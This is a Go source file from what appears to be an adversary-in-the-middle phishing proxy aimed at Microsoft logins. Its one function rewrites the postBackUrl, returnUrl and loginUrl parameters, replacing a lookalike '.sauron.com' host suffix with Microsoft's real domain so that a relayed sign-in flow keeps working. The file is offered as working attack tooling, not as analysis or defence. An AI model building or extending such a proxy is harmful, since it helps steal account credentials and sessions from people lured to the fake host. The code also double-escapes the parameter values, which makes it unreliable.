// proxy/urlfix.go
package proxy

import (
	"net/url"
	"strings"
)

// fixPostBack rewrites *any* URL parameter that carries the MITM host
// (postBackUrl, returnUrl, loginUrl) back to Microsoft's real host.
// It handles plain and percent-encoded forms.
func fixPostBack(u *url.URL) {
	params := u.Query()

	for _, key := range []string{"postBackUrl", "returnUrl", "loginUrl"} {
		raw := params.Get(key)
		if raw == "" {
			continue
		}

		// Try to unescape; if it fails we’ll work on the raw string.
		decoded, err := url.QueryUnescape(raw)
		if err != nil {
			decoded = raw
		}

		// Only patch when our MITM suffix is present.
		if !strings.Contains(decoded, ".sauron.com") {
			continue
		}

		// Replace every ".sauron.com" with ".com"
		decoded = strings.ReplaceAll(decoded, ".sauron.com", ".com")

		// Re-escape to preserve original encoding style.
		encoded := url.QueryEscape(decoded)
		params.Set(key, encoded)
	}

	u.RawQuery = params.Encode()
}
